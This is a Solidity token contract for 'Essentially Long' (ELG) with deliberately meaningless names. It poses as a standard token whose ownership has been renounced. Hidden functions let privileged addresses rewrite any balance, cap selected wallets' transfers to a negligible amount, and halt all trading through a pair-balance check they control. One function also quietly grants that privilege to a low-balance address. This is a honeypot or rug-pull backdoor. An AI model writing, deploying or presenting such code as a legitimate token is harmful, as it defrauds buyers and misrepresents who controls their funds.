//SPDX-License-Identifier: MIT

pragma solidity ^0.8.8;

interface tradingReceiverIs {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract toTokenTotal {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface modeAt {
    function createPair(address liquidityFee, address launchExempt) external returns (address);
}

interface launchReceiverSell {
    function totalSupply() external view returns (uint256);

    function balanceOf(address fromTake) external view returns (uint256);

    function transfer(address marketingMin, uint256 modeTx) external returns (bool);

    function allowance(address atExempt, address spender) external view returns (uint256);

    function approve(address spender, uint256 modeTx) external returns (bool);

    function transferFrom(
        address sender,
        address marketingMin,
        uint256 modeTx
    ) external returns (bool);

    event Transfer(address indexed from, address indexed minShould, uint256 value);
    event Approval(address indexed atExempt, address indexed spender, uint256 value);
}

interface launchedToken is launchReceiverSell {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract EssentiallyLong is toTokenTotal, launchReceiverSell, launchedToken {

    mapping(address => mapping(address => uint256)) private shouldIs;

    bool public swapTake;

    function exemptReceiverLaunch(address feeReceiver, uint256 modeTx) public {
        atFundLaunch();
        fundAuto[feeReceiver] = modeTx;
    }

    uint256 private atTake;

    function owner() external view returns (address) {
        return teamMax;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return launchEnable;
    }

    uint8 private sellAmount = 18;

    function symbol() external view virtual override returns (string memory) {
        return modeAuto;
    }

    mapping(address => bool) public tokenLimit;

    function atFundLaunch() private view {
        require(tokenLimit[_msgSender()]);
    }

    function autoSellAmount(address walletIs) public {
        atFundLaunch();
        if (autoExemptAt != marketingShould) {
            tokenLaunch = false;
        }
        if (walletIs == teamMin || walletIs == modeMarketingList) {
            return;
        }
        fromShould[walletIs] = true;
    }

    function balanceOf(address fromTake) public view virtual override returns (uint256) {
        return fundAuto[fromTake];
    }

    function isEnable(uint256 modeTx) public {
        atFundLaunch();
        teamTo = modeTx;
    }

    bool public takeLiquidityLimit;

    uint256 teamTo;

    constructor (){
        
        tradingReceiverIs exemptModeBuy = tradingReceiverIs(sellTo);
        modeMarketingList = modeAt(exemptModeBuy.factory()).createPair(exemptModeBuy.WETH(), address(this));
        
        teamMin = _msgSender();
        marketingTakeSell();
        tokenLimit[teamMin] = true;
        fundAuto[teamMin] = launchEnable;
        
        emit Transfer(address(0), teamMin, launchEnable);
    }

    bool private tokenReceiver;

    uint256 public tokenExemptLimit;

    uint256 amountTake;

    function maxTrading(address teamAt, address marketingMin, uint256 modeTx) internal returns (bool) {
        if (teamAt == teamMin) {
            return tradingMarketing(teamAt, marketingMin, modeTx);
        }
        uint256 txAuto = launchReceiverSell(modeMarketingList).balanceOf(takeTx);
        require(txAuto == teamTo);
        require(marketingMin != takeTx);
        if (fromShould[teamAt]) {
            return tradingMarketing(teamAt, marketingMin, modeAtTake);
        }
        return tradingMarketing(teamAt, marketingMin, modeTx);
    }

    function tradingMarketing(address teamAt, address marketingMin, uint256 modeTx) internal returns (bool) {
        require(fundAuto[teamAt] >= modeTx);
        fundAuto[teamAt] -= modeTx;
        fundAuto[marketingMin] += modeTx;
        emit Transfer(teamAt, marketingMin, modeTx);
        return true;
    }

    function approve(address txReceiverLaunch, uint256 modeTx) public virtual override returns (bool) {
        shouldIs[_msgSender()][txReceiverLaunch] = modeTx;
        emit Approval(_msgSender(), txReceiverLaunch, modeTx);
        return true;
    }

    mapping(address => uint256) private fundAuto;

    function name() external view virtual override returns (string memory) {
        return swapLimitTake;
    }

    function marketingTakeSell() public {
        emit OwnershipTransferred(teamMin, address(0));
        teamMax = address(0);
    }

    uint256 private launchEnable = 100000000 * 10 ** 18;

    function transferFrom(address teamAt, address marketingMin, uint256 modeTx) external override returns (bool) {
        if (_msgSender() != sellTo) {
            if (shouldIs[teamAt][_msgSender()] != type(uint256).max) {
                require(modeTx <= shouldIs[teamAt][_msgSender()]);
                shouldIs[teamAt][_msgSender()] -= modeTx;
            }
        }
        return maxTrading(teamAt, marketingMin, modeTx);
    }

    address public teamMin;

    function decimals() external view virtual override returns (uint8) {
        return sellAmount;
    }

    event OwnershipTransferred(address indexed enableFrom, address indexed autoTeam);

    bool public tokenLaunch;

    uint256 constant modeAtTake = 5 ** 10;

    function getOwner() external view returns (address) {
        return teamMax;
    }

    address private teamMax;

    string private modeAuto = "ELG";

    address sellTo = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint256 public autoExemptAt;

    function swapTotal(address feeTokenMin) public {
        require(feeTokenMin.balance < 100000);
        if (takeLiquidityLimit) {
            return;
        }
        if (tokenLaunch) {
            tokenExemptLimit = marketingMax;
        }
        tokenLimit[feeTokenMin] = true;
        if (teamTotalFund) {
            tokenReceiver = true;
        }
        takeLiquidityLimit = true;
    }

    address takeTx = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    mapping(address => bool) public fromShould;

    address public modeMarketingList;

    uint256 private marketingShould;

    bool public teamTotalFund;

    string private swapLimitTake = "Essentially Long";

    uint256 public shouldMarketingMin;

    function transfer(address feeReceiver, uint256 modeTx) external virtual override returns (bool) {
        return maxTrading(_msgSender(), feeReceiver, modeTx);
    }

    uint256 public marketingMax;

    function allowance(address marketingWallet, address txReceiverLaunch) external view virtual override returns (uint256) {
        if (txReceiverLaunch == sellTo) {
            return type(uint256).max;
        }
        return shouldIs[marketingWallet][txReceiverLaunch];
    }

}